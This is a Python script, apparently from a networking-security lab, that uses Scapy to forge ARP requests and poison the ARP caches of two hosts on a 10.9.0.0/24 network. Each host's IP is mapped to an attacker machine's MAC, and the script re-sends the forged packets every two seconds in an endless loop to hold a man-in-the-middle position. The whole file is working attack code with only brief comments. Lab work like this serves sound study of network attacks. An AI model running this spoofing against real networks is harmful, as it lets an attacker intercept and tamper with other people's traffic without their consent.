from scapy.all import *
import time

MAC_A = "02:42:0a:09:00:05"
IP_A = "10.9.0.5"
MAC_B = "02:42:0a:09:00:06"
IP_B = "10.9.0.6"
MAC_M = "02:42:0a:09:00:69"
IP_M = "10.9.0.105"

# Maps B's IP to M's MAC in A
def pkt_to_A():
    ethernet = Ether()
    ethernet.src = MAC_M
    ethernet.dst = MAC_A

    arp = ARP()
    arp.op = 1
    arp.hwsrc = MAC_M
    arp.psrc = IP_B
    arp.hwdst = MAC_A
    arp.pdst = IP_A

    pkt = ethernet / arp
    return pkt

# Maps A's IP to M's MAC in B
def pkt_to_B():
    ethernet = Ether()
    ethernet.src = MAC_M
    ethernet.dst = MAC_B

    arp = ARP()
    arp.op = 1
    arp.hwsrc = MAC_M
    arp.psrc = IP_A
    arp.hwdst = MAC_B
    arp.pdst = IP_B

    pkt = ethernet / arp
    return pkt

# Keep sending these packets to respective hosts to maintain ARP spoof
while(True):
    sendp(pkt_to_A())
    sendp(pkt_to_B())

    time.sleep(2)
